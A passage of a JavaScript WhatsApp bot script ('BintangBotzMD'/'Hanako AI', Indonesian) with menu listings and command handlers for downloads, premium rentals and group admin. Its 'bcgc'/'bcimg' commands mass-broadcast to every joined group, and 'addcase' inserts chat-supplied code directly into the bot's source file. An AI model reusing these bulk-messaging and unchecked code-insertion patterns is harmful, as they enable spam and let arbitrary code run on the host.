     ヤ ◦  sound86
     ヤ ◦  sound87
     ヤ ◦  sound88
     ヤ ◦  sound89
     ヤ ◦  sound90
     ヤ ◦  sound91
     ヤ ◦  sound92
     ヤ ◦  sound93
     ヤ ◦  sound94
     ヤ ◦  sound95
     ヤ ◦  sound96
     ヤ ◦  sound97
     ヤ ◦  sound98
     ヤ ◦  sound99
     ヤ ◦  sound100
     ヤ ◦  sound101
     ヤ ◦  sound102
     ヤ ◦  sound103
     ヤ ◦  sound104
     ヤ ◦  sound105
     ヤ ◦  sound106
     ヤ ◦  sound107
     ヤ ◦  sound108
     ヤ ◦  sound109
     ヤ ◦  sound110
     ヤ ◦  sound111
     ヤ ◦  sound112
     ヤ ◦  sound113
     ヤ ◦  sound114
     ヤ ◦  sound115
     ヤ ◦  sound116
     ヤ ◦  sound117
     ヤ ◦  sound118
     ヤ ◦  sound119
     ヤ ◦  sound120
     ヤ ◦  sound121
     ヤ ◦  sound122
     ヤ ◦  sound123
     ヤ ◦  sound124
     ヤ ◦  sound125
     ヤ ◦  sound126
     ヤ ◦  sound127
     ヤ ◦  sound128
     ヤ ◦  sound129
     ヤ ◦  sound130
     ヤ ◦  sound131
     ヤ ◦  sound132
     ヤ ◦  sound133
     ヤ ◦  sound134
     ヤ ◦  sound135
     ヤ ◦  sound136
     ヤ ◦  sound137
     ヤ ◦  sound138
     ヤ ◦  sound139
     ヤ ◦  sound140
     ヤ ◦  sound141
     ヤ ◦  sound142
     ヤ ◦  sound143
     ヤ ◦  sound144
     ヤ ◦  sound145
     ヤ ◦  sound146
     ヤ ◦  sound147
     ヤ ◦  sound148
     ヤ ◦  sound149
     ヤ ◦  sound150
     ヤ ◦  sound151
     ヤ ◦  sound152
     ヤ ◦  sound153
     ヤ ◦  sound154
     ヤ ◦  sound155
     ヤ ◦  sound156
     ヤ ◦  sound157
     ヤ ◦  sound158
     ヤ ◦  sound159
     ヤ ◦  sound160
     ヤ ◦  sound161

┈─────────────────┈⫺
*メ S A D M E N U*
┈─────────────────┈⫺
     ヤ ◦ sad1
     ヤ ◦ sad2
     ヤ ◦ sad3
     ヤ ◦ sad4
     ヤ ◦ sad5
     ヤ ◦ sad6
     ヤ ◦ sad7
     ヤ ◦ sad8
     ヤ ◦ sad9
     ヤ ◦ sad10
     ヤ ◦ sad11
     ヤ ◦ sad12
     ヤ ◦ sad13
     ヤ ◦ sad14
     ヤ ◦ sad15
     ヤ ◦ sad16
     ヤ ◦ sad17
     ヤ ◦ sad18
     ヤ ◦ sad19
     ヤ ◦ sad20
     ヤ ◦ sad21
     ヤ ◦ sad22
     ヤ ◦ sad23
     ヤ ◦ sad24
     ヤ ◦ sad25
     ヤ ◦ sad26
     ヤ ◦ sad27
     ヤ ◦ sad28
     ヤ ◦ sad29
     ヤ ◦ sad30
     ヤ ◦ sad31
     ヤ ◦ sad32
     ヤ ◦ sad33
     ヤ ◦ sad34
     ヤ ◦ sad35

┈─────────────────┈⫺     
*メ C E R P E N M E N U*
┈─────────────────┈⫺
     ヤ ◦ cerpen anak
     ヤ ◦ cerpen bahasadaerah
     ヤ ◦ cerpen bahasainggris
     ヤ ◦ cerpen bahasajawa
     ヤ ◦ cerpen bahasasunda
     ヤ ◦ cerpen budaya
     ヤ ◦ cerpen cinta
     ヤ ◦ cerpen cintaislami
     ヤ ◦ cerpen cintapertama
     ヤ ◦ cerpen cintaromantis
     ヤ ◦ cerpen cintasedih
     ヤ ◦ cerpen cintasegitiga
     ヤ ◦ cerpen cintasejati
     ヤ ◦ cerpen galau
     ヤ ◦ cerpen gokil
     ヤ ◦ cerpen inspirasi
     ヤ ◦ cerpen jepang
     ヤ ◦ cerpen kehidupan
     ヤ ◦ cerpen keluarga
     ヤ ◦ cerpen kisahnyata
     ヤ ◦ cerpen korea
     ヤ ◦ cerpen kristen
     ヤ ◦ cerpen liburan
     ヤ ◦ cerpen malaysia
     ヤ ◦ cerpen mengharukan
     ヤ ◦ cerpen misteri
     ヤ ◦ cerpen motivasi
     ヤ ◦ cerpen nasihat
     ヤ ◦ cerpen olahraga
     ヤ ◦ cerpen patahhati
     ヤ ◦ cerpen penantian
     ヤ ◦ cerpen pendidikan
     ヤ ◦ cerpen pengalaman
     ヤ ◦ cerpen pengorbanan
     ヤ ◦ cerpen penyesalan
     ヤ ◦ cerpen perjuangan
     ヤ ◦ cerpen perpisahan
     ヤ ◦ cerpen persahabatan
     ヤ ◦ cerpen petualangan
     ヤ ◦ cerpen ramadhan
     ヤ ◦ cerpen remaja
     ヤ ◦ cerpen rindu
     ヤ ◦ cerpen rohani
     ヤ ◦ cerpen romantis
     ヤ ◦ cerpen sastra
     ヤ ◦ cerpen sedih
     ヤ ◦ cerpen sejarah
     
┈─────────────────┈⫺     
*メ E P H O T O M E N U*
┈─────────────────┈⫺
     ヤ ◦ glitchtext
     ヤ ◦ writetext
     ヤ ◦ advancedglow
     ヤ ◦ typographytext
     ヤ ◦ pixelglitch
     ヤ ◦ neonglitch
     ヤ ◦ flagtext
     ヤ ◦ flag3dtext
     ヤ ◦ deletingtext
     ヤ ◦ blackpinkstyle
     ヤ ◦ glowingtext
     ヤ ◦ underwatertext
     ヤ ◦ logomakerl
     ヤ ◦ cartoonstyle
     ヤ ◦ papercutstyle
     ヤ ◦ watercolortext
     ヤ ◦ effectclouds
     ヤ ◦ blackpinklogo
     ヤ ◦ gradienttext
     ヤ ◦ summerbeach
     ヤ ◦ mluxurygold
     ヤ ◦ multicoloredneon
     ヤ ◦ sandsummer
     ヤ ◦ galaxywallpaper
     ヤ ◦ 1917style
     ヤ ◦ lmakingneon
     ヤ ◦ royaltext
     ヤ ◦ freecreate
     ヤ ◦ galaxystyle
     ヤ ◦ lighteffects
     
Created By BintangBotzMD
Eror? Report .owner`
kyy.sendMessage(m?.chat, {
text: menuu,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `BintangBotzMD`,
body: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ BintzGE',
thumbnailUrl: 'https://telegra.ph/file/440546854e464e04c1427.png',
sourceUrl: 'https://chat.whatsapp.com/I9mpo2iIuadBdkee7EZnz4',
mediaType: 1,
renderLargerThumbnail: true
}
}
}
)
await kyy.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/yayaya.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
//=============== F E A T U R E ======================//
case 'owner': {
const kontak = {
"displayName": 'BintzGE_Gantengg',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: INI OWNER\nEND:VCARD`
}
await kyy.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`BintzGE Yg Tamvan`), 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./KyyMedia/image/kyy.jpg"),
"mediaUrl": `https://telegra.ph/file/440546854e464e04c1427.png`,
"sourceUrl": `https://whatsapp.com/channel/0029VagJvtD05MUj4Ljm7P0E`
}}}, { quoted: fcall })
}
break
break
case 'cekasalmember': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
  if (!m.isGroup) return m.reply(mess.group)
  const participants = await kyy.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
const phoneNumber = participant.id.split('@')[0];
if (phoneNumber.startsWith("62")) {
  countIndonesia++;
} else if (phoneNumber.startsWith("60")) {
  countMalaysia++;
} else if (phoneNumber.startsWith("1")) {
  countUSA++;
} else if (phoneNumber.startsWith("+1")) {
  countOther++;
} else {
  countOther++;
}
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  m.reply(replyMessage);
}
  break
  case 'buyprem': case 'buypremium':{
  m.reply(` ᴋᴇᴛɪᴋ  .ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴛʀᴀɴsғᴇʀ sᴀᴊᴀ ᴛʀs ᴋɪʀɪᴍ ʙᴜᴋᴛɪ ᴋᴇ ᴏᴏᴡɴᴇʀ `) 
  }
  break
  case 'group': {   
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
if (args[0] === 'close'){
await kyy.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await kyy.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
kyy.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
case 'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0>9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await kyy.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'sc': case 'script': {
tut = `Buy The Script BintzGE
_Bennefits_
- Free Apikey
- Work Feature
- Dll`
await kyy.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/sc.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case 'sewa': case 'bot': case 'sewabot': case 'hanako': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: 'Permanen',
description: `Sewa Hanako Ai 20k`, 
id: `.pembayaran`
},
{
title: 'Sewa4h',
description: "Sewa Hanako Ai 3k", 
id: `.pembayaran`
},
{
title: 'Sewa7h', 
description: "Sewa Hanako Ai 5k", 
id: `.pembayaran`
},
{
title: 'Sewa10h', 
description: "Sewa Hanako Ai 7k", 
id: `.pembayaran`
},
{
title: 'Sewa14h', 
description: "Sewa Hanako Ai 10k", 
id: `.pembayaran`
},
{
title: 'Sewa16h', 
description: "Sewa Hanako 13k", 
id: `.pembayaran`
},
{
title: 'Sebulan', 
description: "Sewa Hanako Ai 16k", 
id: `.sewasebulan`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1234567890@newsletter',
 newsletterName: 'Powered By KyyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Sewa Hanako Ai Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/440546854e464e04c1427.png" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await kyy.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./src/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break
case 'listpremium': case 'listprem': {
if (!isCreator) return reply(mess.owner)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
kyy.sendTextWithMentions(m.chat, txt, m)
}
break
case "bcimg": {
if (!isCreator) return reply(`ᴋʜᴜsᴜs Bintz ᴅᴏᴀɴᴋ ʟᴏʟ`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await kyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await kyy.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await kyy.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await kyy.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await kyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
kyy.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'restart':
if (!isCreator) return reply('ᴋʜᴜsᴜs ᴋʏʏ ᴅᴏᴀɴᴋ')
reply(`ᴍʀᴇsᴛᴀʀᴛ ʜᴀɴᴀᴋᴏ ᴀɪ....`)
await sleep(3000)
process.exit()
break
case 'runtime': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await kyy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'delcase': {
if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ ᴀᴊ ʟᴏʟ`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./hanako.js', q)
reply('*Dellcase Successfully*')
}
break
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'hanako.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
case'tozombie':{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await kyy.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
case 'ai': case 'openai': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')  
if (!text) return reply(`${command} ᴋʏʏ ᴀᴘᴀ ɪᴛ ᴏᴡɴᴇʀ ᴍᴜ? `)
            reply(mess.search)
            let yanz = await fetchJson(`https://aemt.me/v2/gpt4?text=${text}`)
kyy.sendMessage(m.chat, {
text: yanz.result,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `O P E N - A I`,
body: '',
thumbnailUrl: "https://telegra.ph/file/440546854e464e04c1427.png",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
break
case "listgc":{
if (!isCreator) return (`ᴋʜᴜsᴜs ᴋʏʏ ᴀᴋ ʟᴏʟ ᴡᴋᴡᴋ`)
let getGroups = await kyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kyy.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case 'antilink': {
if (!isCreator) return reply('*khusus Bintz Aj Su*')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ᴋʜᴜsᴜs ᴀᴅᴍɪɴ ɢʀᴏᴜᴘ')
await loading()
if (args.length < 1) return m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
if (args[0] === "on") {
if (AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
ntilink.push(from)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴍᴀᴛɪ')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴅɪ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
} else {
m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
}
}
break
case 'tourl': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return reply2(mess.ban)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await kyy.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'public': {
if (!isCreator) return mess.owner
kyy.public = true
reply('HANAKO AI SUKSES MODE PUBLIC')
}
break
case 'self': {
if (!isCreator) return mess.owner
kyy.public = false
reply('HANAKO SUCCES MODE SELF')
}
break
//================ D O W N L O A D ==================//
case 'ytmp3': case 'youtubemp3': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
await loading ()
reply(mess.search)
downloadMp3(text)
}
break
case "ytreels": case "ytmp4":{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return reply('ʟɪɴᴋ ɴʏ ᴍᴀɴᴀ ʙɪᴀʀ Bot ᴘʀᴏsᴇs')
await loading ()
reply(mess.search)
downloadMp4(text)
}
break
case 'tt': case "tiktok":{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return reply(`ʟɪɴᴋ ɴʏ ᴍɴ ʙɪᴀʀ Bot ᴘʀᴏsᴇs`)
let old = new Date()
const dlt = require('./lib/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await kyy.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
kyy.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
}
}
break
case 'instagram': { 
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) throw `Example : ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`
await loading ()
reply(mess.search)
let iganu = await igdl2(text)
kyy.sendMessage(m.chat, { video: { url: iganu[0].url }, caption: mess.success })
}
break
case 'spotify': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `乂 *S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
kyy.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'sᴘᴏᴛɪғʏ ʙʏ ᴋʏᴜxᴅ',
"body": `ʜᴀɴᴀᴋᴏ ᴀɪ`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/50afb355fac55370492de.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: fcall})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
kyy.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `sᴘᴏᴛɪғʏ ʙʏ Bintz`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/440546854e464e04c1427.png', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: fcall
})
}
break   
case 'play': {
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let wait = await kyy.sendMessage(m.chat, {text: `_Searching.. [ ${text} ] 🔍_`}, {quoted: fcall, ephemeralExpiration: 86400})
let search = await yts(`${text}`)

let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${search.all[0].views}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
await kyy.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: 86400});
kyy.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}},)
   })
const alicevidoh = require('./lib/ytdl2')
const vid=await alicevidoh.mp4(`${search.videos[0].url}`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await kyy.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},)
}
kyy.sendMessage(m.chat, {react: {text: '🎧', key: m.key}})
break
case 'yts': case 'ytsearch': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
  if (!text) return reply(`*Example :* ${prefix + command} judulnya`);

  await m.reply(mess.wait);

  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;

    if (!videos || videos.length === 0) {
      reply('No video found');
      return;
    }

    // Pilih antara 1 dan 5 video secara acak
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];

    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Menghindari pemilihan video yang sama
      selectedVideos.push(randomVideo);
    }

    let push = [];

    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;

      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: kyy.waUploadToServer });

      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ke - ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Video 🎦","id":"${prefix}ytmp4 ${video.url}"}`
            },
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Audio 🎵","id":"${prefix}ytmp3 ${video.url}"}`
            }
          ]
        })
      });
    }

    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
